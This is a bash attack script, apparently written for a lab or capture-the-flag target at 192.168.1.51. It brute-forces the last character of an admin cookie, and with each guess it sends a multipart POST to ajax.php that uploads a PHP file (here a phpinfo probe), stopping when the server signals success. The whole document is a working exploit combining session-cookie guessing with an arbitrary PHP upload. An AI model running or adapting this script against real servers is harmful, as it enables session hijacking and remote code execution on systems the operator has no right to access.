#!/bin/bash


#ookie_prefix="&G6u@B6uDXMq&Ms";
cookie_prefix="%26G6u%40B6uDXMq%26Ms"
#cookie_prefix="Jkc2dUBCNnVEWE1xJk1zCg=="

letter_set="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
#letter_set="R"

letter_set_size=$(echo $letter_set | wc -c)
((letter_set_size=letter_set_size-1))

outputfile="curloutput.txt"
	
for letter_index in $(seq 0 $letter_set_size)
do
	character=${letter_set:letter_index:1}
	cookieraw=$cookie_prefix$character
	#cookie=$(echo $cookieraw | base64)
	cookie=$cookieraw

	echo "trying cookie $cookieraw | $cookie"


curl -i -s -k \
	-X $'POST' \
    -H $'Host: 192.168.1.51' \
    -H $'Content-Length: 306' \
    -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36' \
    -H $'Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8Hgqi2BFdvGdfGXr' \
    -H $'Accept: */*' \
    -H $'Origin: http://192.168.1.51' \
    -H $'Referer: http://192.168.1.51/dashboard.html' \
    -H $'Accept-Encoding: gzip, deflate' \
    -H $'Accept-Language: en-US,en;q=0.9' \
    -H $'Connection: close' \
    -b "admin=$cookie" \
    --data-binary $'------WebKitFormBoundary8Hgqi2BFdvGdfGXr\x0d\x0aContent-Disposition: form-data; name=\"secure\"\x0d\x0a\x0d\x0aval1d\x0d\x0a------WebKitFormBoundary8Hgqi2BFdvGdfGXr\x0d\x0aContent-Disposition: form-data; name=\"file\"; filename=\"test.php\"\x0d\x0aContent-Type: application/x-php\x0d\x0a\x0d\x0a<?php phpinfo(); ?>\x0d\x0a------WebKitFormBoundary8Hgqi2BFdvGdfGXr--\x0d\x0a' \
    --output $outputfile \
    $'http://192.168.1.51/ajax.php'
    
 	response=$(tail -c 1 $outputfile)
	if [ $response -eq 1 ]
	then
		echo cookie found: $cookie
		exit 0
	fi

	echo
done

echo no cookie found
exit 1
